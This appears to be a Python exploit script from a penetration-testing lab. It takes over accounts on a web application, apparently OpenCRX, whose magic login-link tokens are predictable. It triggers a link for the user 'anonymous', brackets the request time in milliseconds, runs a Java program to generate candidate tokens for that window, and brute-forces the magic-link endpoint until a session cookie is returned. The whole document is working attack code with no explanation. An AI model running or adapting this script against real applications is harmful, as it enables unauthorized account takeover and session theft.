#!/usr/bin/env python3
import requests
# date +%s%3N && curl -s -i -X 'POST' --data-binary 'username=anonymous' 'http://answers/generateMagicLink' && date +%s%3N
import os
import time
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
start = int(time.time()*1000)-500
print(start)
data = b"username=anonymous"
#os.system("curl -s -i -X 'POST' --data-binary 'username=anonymous' 'http://answers/generateMagicLink'")
os.system("curl -s -i -X 'POST' --data-binary 'username=anonymous' 'http://192.168.235.251//generateMagicLink'")
#r = requests.post(url="http://answers/generateMagicLink",data=data, proxies=proxies)
r = requests.post(url="http://192.168.235.251/generateMagicLink",data=data, proxies=proxies)
print (r.headers)
end = int(time.time()*1000)+500
print(end)
#os.system(f"java OpenCRXToken {start} {end}> tokens.txt")
os.system(f"java MagicTokenGenerator {start} {end} 2 > tokens.txt")
time.sleep(2)
# fuzz token
print("Fuzzing token")

with open("tokens.txt", "r") as f:
    for word in f:
        token = word.strip()
        # print(token)
        #r = requests.get(url=f"http://192.168.235.251//magicLink/{token}", allow_redirects=False)
        r = requests.get(url=f"http://192.168.235.251//magicLink/{token}", allow_redirects=False)
        if(r.cookies):
            print(r.cookies)
